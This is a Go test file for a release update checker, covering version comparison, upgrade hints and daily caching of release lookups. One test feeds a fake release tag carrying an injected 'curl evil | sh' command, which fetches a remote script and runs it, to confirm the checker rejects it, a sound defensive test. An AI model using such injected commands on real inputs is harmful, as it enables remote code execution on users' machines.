package update

import (
	"context"
	"net/http"
	"net/http/httptest"
	"sync/atomic"
	"testing"
	"time"
)

func TestNewer(t *testing.T) {
	for _, c := range []struct {
		cur, latest string
		want        bool
	}{
		{"0.2.0", "0.3.0", true},
		{"0.2.0", "v0.2.1", true},
		{"0.10.0", "0.9.9", false},
		{"0.2.0", "0.2.0", false},
		{"dev", "0.3.0", false},
		{"0.3.0-rc1", "0.3.0", false},
		{"0.2.0", "garbage", false},
	} {
		if got := Newer(c.cur, c.latest); got != c.want {
			t.Errorf("Newer(%q, %q) = %v", c.cur, c.latest, got)
		}
	}
}

func TestHint(t *testing.T) {
	for exe, want := range map[string]string{
		"/opt/homebrew/Caskroom/safe-install/0.2.0/safe-install":      "brew upgrade --cask safe-install",
		"/home/linuxbrew/.linuxbrew/bin/safe-install":                 "brew upgrade --cask safe-install",
		`C:\Users\a\scoop\apps\safe-install\current\safe-install.exe`: "scoop update safe-install",
		"/home/a/go/bin/safe-install":                                 "go install github.com/crossben/safe-install/cmd/safe-install@latest",
		"/usr/bin/safe-install":                                       "download the .deb, .rpm or .apk from " + ReleasesURL,
		"/somewhere/safe-install":                                     "download it from " + ReleasesURL,
	} {
		if got := Hint(exe, "linux"); got != want {
			t.Errorf("Hint(%q) = %q", exe, got)
		}
	}
}

func TestLatestIsCachedForADay(t *testing.T) {
	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls.Add(1)
		_, _ = w.Write([]byte(`{"tag_name":"v0.3.0"}`))
	}))
	defer srv.Close()
	now := time.Date(2026, 10, 6, 12, 0, 0, 0, time.UTC)
	c := &Checker{URL: srv.URL, CacheDir: t.TempDir(), Now: func() time.Time { return now }}
	for range 2 {
		if v, err := c.Latest(context.Background()); err != nil || v != "0.3.0" {
			t.Fatalf("Latest = %q, %v", v, err)
		}
	}
	if calls.Load() != 1 {
		t.Fatalf("%d requests within a day, want 1", calls.Load())
	}
	now = now.Add(25 * time.Hour)
	_, _ = c.Latest(context.Background())
	if calls.Load() != 2 {
		t.Fatal("not checked again after a day")
	}
}

func TestBadTagRejected(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"tag_name":"v9.9.9; curl evil | sh"}`))
	}))
	defer srv.Close()
	if _, err := (&Checker{URL: srv.URL}).Latest(context.Background()); err == nil {
		t.Fatal("accepted a tag that is not a version")
	}
}
